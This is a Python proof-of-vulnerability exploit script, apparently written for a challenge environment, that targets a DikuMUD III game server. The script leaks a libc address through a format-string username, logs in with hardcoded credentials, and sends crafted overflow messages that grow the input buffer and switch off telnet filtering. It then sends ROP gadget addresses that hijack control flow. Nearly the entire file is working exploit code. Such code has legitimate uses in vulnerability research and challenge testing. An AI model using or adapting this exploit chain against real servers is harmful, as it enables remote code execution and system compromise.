from random import getrandbits
import sys
import os
import signal
import requests as req
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
import base64
import multiprocessing
from pwn import *

go_ahead = b'\xff\xf9'
header = b'\xff\xfc\x01'
footer = b'\xff\xfb\x01\xff'


def handler(signum, frame):
    print('Process timeout.')
    print('[FAILED] POV Failed')
    exit(0)

def recvdata(conn):
    footerfound = False
    recvd = conn.recvuntil(go_ahead, timeout=2)
    if not recvd:
        print("Missing go-ahead: quitting")
        exit()
    if recvd.find(header) >= 0:
        recvd = recvd[recvd.find(header) + 5:]
    if recvd.find(footer) >= 0:
        footerfound = True
        recvd = recvd[:recvd.find(footer)]
    if recvd.find(go_ahead) >= 0 and not footerfound:
        recvd = recvd[:recvd.find(go_ahead)]
    #print(recvd)   
    #print('DIKUMUD3:> ' + recvd.decode('utf-8'))
    return recvd.decode('utf-8')

def senddata(conn, data):
    #print('User(', data, ')', flush=True)
    conn.sendline(data.encode('utf-8'))

def userLogin(conn, username, password):
    conn.recvuntil(b'By what name do they call you? ').decode('utf-8') #)
    senddata(conn, username)
    return recvdata(conn)

def existingUserLogin(conn, username, password):
    #print(
    conn.recvuntil(b'By what name do they call you? ').decode('utf-8') # )
    senddata(conn, username)
    result=recvdata(conn)
    ## check for message for "ATTENTION" means bad passwords
    #print(result)
    if isBadPassword(result):
        print("Previous bad password")
        senddata(conn, '\n')
        recvdata(conn)
    senddata(conn, password)
    result = conn.recv()
    if result == header:
        return conn.recv()
    else:
        return result


def isBadPassword(message):
    findAttention=message.find('ATTENTION')
    if findAttention == -1:
        return False
    return True


def getLeakAddress(host, port):
    username = '(' + 'a'*79 + '%17$p '
    password = ''
    conn = remote(host, port)
    result = userLogin(conn, username, password)
    findaddress=result[(result.find('0x')):result.find(')')]
    if findaddress == "":
        print('[FAILED] POV Failed: Missing Address Leak')
        conn.close()
        exit(0)
    print('ADDRESS LEAK=' + findaddress, flush=True)
    conn.close()
    return findaddress

def isLoggedIn(message):
    #print(message)
    findWelcome=message.find(b'Welcome back Chess, you last visited DikuMUD III Git Vanilla')
    #print(findWelcome)
    if findWelcome == -1:
        print('[FAILED] POV Failed: Unable to Login')
        return False
    return True

def incBufferByTwo(conn):
    message=b'\x31' + b'\x41'*1020 + b'\x1b' + b'[' + b'M' + b'\r\n'
    conn.send(message)
    recvdata(conn)

def incBufferTo7e7e(conn):
    message=b'\x32' + b'\x41'*1023 + b'\x7e'*2 + b'\r\n'
    conn.send(message)
    recvdata(conn)

def disableTelnet(conn):
    message=b'\x33' + b'\x41'*1023 + b'\x7e'*4 + b'\x8f' + b'\r\n'
    conn.send(message)
    recvdata(conn)

def getStackPivotAddr(leakAddress):
    ## Calculate stack_pivot_gadget_address = (leak-libc_offset) + offset_to_gadget
    offsetToLibc=0x370D0
    offsetToStackPivotGadget=0x5e64b
    startOfLibc=leakAddress-offsetToLibc
    stackPivotGadget=startOfLibc+offsetToStackPivotGadget
    spgBytes = stackPivotGadget.to_bytes(6, 'little')
    for x in range(0,6):
        if spgBytes[x] < 32 or spgBytes[x] == 255:
            print("PIVOT: Cannot create address for byte " + str(x) + "(" + hex(spgBytes[x]) + ")")
            print("Restart Challenge container to try a new address before re-running")
            print("Tried Address:" + str(p64(stackPivotGadget)))
            exit(0)
    return stackPivotGadget

def getJmpRAXAddr(leakAddress):
    ## Calculate pop_rax_address = (leak-libc_offset) + offset_to_gadget
    offsetToLibc=0x370D0
    offsetToStackPivotGadget=0x27429
    startOfLibc=leakAddress-offsetToLibc
    stackPivotGadget=startOfLibc+offsetToStackPivotGadget
    spgBytes = stackPivotGadget.to_bytes(6, 'little')
    for x in range(0,6):
        if spgBytes[x] < 32 or spgBytes[x] == 255:
            print("JMPRAX:Cannot create address for byte " + str(x) + "(" + hex(spgBytes[x]) + ")!")
            print("Restart Challenge container to try a new address before re-running")
            print("Tried Address:" + str(p64(stackPivotGadget)))
            exit(0)
    return stackPivotGadget

def getPopRAXAddr(leakAddress):
    ## Calculate pop_rax_address = (leak-libc_offset) + offset_to_gadget
    offsetToLibc=0x370D0
    offsetToStackPivotGadget=0x5f296
    startOfLibc=leakAddress-offsetToLibc
    stackPivotGadget=startOfLibc+offsetToStackPivotGadget
    spgBytes = stackPivotGadget.to_bytes(6, 'little')
    for x in range(0,6):
        if spgBytes[x] < 32 or spgBytes[x] == 255:
            print("POPRAX: Cannot create address for byte " + str(x) + "(" + hex(spgBytes[x]) + ")")
            print("Restart Challenge container to try a new address before re-running")
            print("Tried Address:" + str(p64(stackPivotGadget)))
            exit(0)
    return stackPivotGadget
    
def exploit(conn, leakAddress):
    #getPopRAXAddr(leakAddress).to_bytes(6, 'little') + b'\xde\xad\xbe\xef' + b'\x41'*1014
    message=getPopRAXAddr(leakAddress).to_bytes(8, 'little') + b'\x42'*8 + getJmpRAXAddr(leakAddress).to_bytes(8, 'little') + b'\x90'*1004 + b'\x7e'*4 + b'\x7e'*4 + getStackPivotAddr(leakAddress).to_bytes(6, 'little') + b'\x1b' + b'[' + b'M' + b'\r\n'
    #message=b'\x90'*1024 + b'\x7e'*4 + b'\x7e'*4 + getStackPivotAddr(leakAddress).to_bytes(6, 'little') + b'\x1b' + b'[' + b'M' + b'\r\n'
    #print(message)
    conn.send(message)
    recvdata(conn)    
    ### ropchain to populate a register
    ###

def main():
    global HOST
    global PORT 
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    #print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'], flush=True)
    print('Host ' + HOST + ' and PORT: ' + str(PORT), flush=True)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(20)

    ## 1. Connect to server with address leak from pov2: value is offset in libc
    leakAddress=int(getLeakAddress(HOST, PORT), 16) ####????ADDRESS has changed need to recalucate offsets for libc!!
    getStackPivotAddr(leakAddress)
    getPopRAXAddr(leakAddress)
    getJmpRAXAddr(leakAddress)
    sleep(1)
    
    ## 2. Login into user: memory corruption is only available with a persistent connection
    username='chess'
    password='chess123'
    conn = remote(HOST, PORT)
    result = existingUserLogin(conn, username, password)
    #print(b'Repsonse ' + result)
    if not isLoggedIn(result):
        print(username + ': Unable to Login')
        conn.close()
        exit(0)
    print("Logged in", flush=True)
    
    ## 3. Create Message: A*1021 + <esc> + [  + M 
    ### this overflows the buffer causing the size of the next read size to be 1026
    print("Buffer plus 2", flush=True)
    incBufferByTwo(conn)
    sleep(1)
    ## 4. Create Message: A*1024 + 0x7e7e 
    ### Max allowable value for an input character is 126 (0x7e) due to being telnet
    ### this two byte overwrite causes the next read size to be 32382 (limited to 1096, by a different size limit)
    print("Increase buffer size", flush=True)
    incBufferTo7e7e(conn)
    sleep(1)
    ## 5. Create Message: A*1024 + <whatever read size (4bytes)> + delete 
    ### This alters the m_nTerminal to 0, allowing the use of ascii characters 32 to 255
    print("Disable telnet", flush=True)
    disableTelnet(conn)
    sleep(1)
    ## 6. Create Message: exploit
    print("Exploit", flush=True)
    exploit(conn, leakAddress)
    sleep(1)
    ## 7. Test Message: if response, then no crash
    try:
        senddata(conn, 's') # go south
        dec_result = recvdata(conn)
    except:
        print("No response from server, POV likely succeeded")
        print("RAX=42424242424242f6")
        print("RIP=42424242424242f6")
        print("RIP value will be address of jump rax instruction, due to segfault")
        print("Verify RIP/RAX via gdb in container")
        print('[SUCCESS] POV Succeeded')
    else:
        #print(dec_result)
        print("Server responded")
        print('[FAILED] POV Failed')

    
    conn.close()



if __name__ == '__main__':
    main()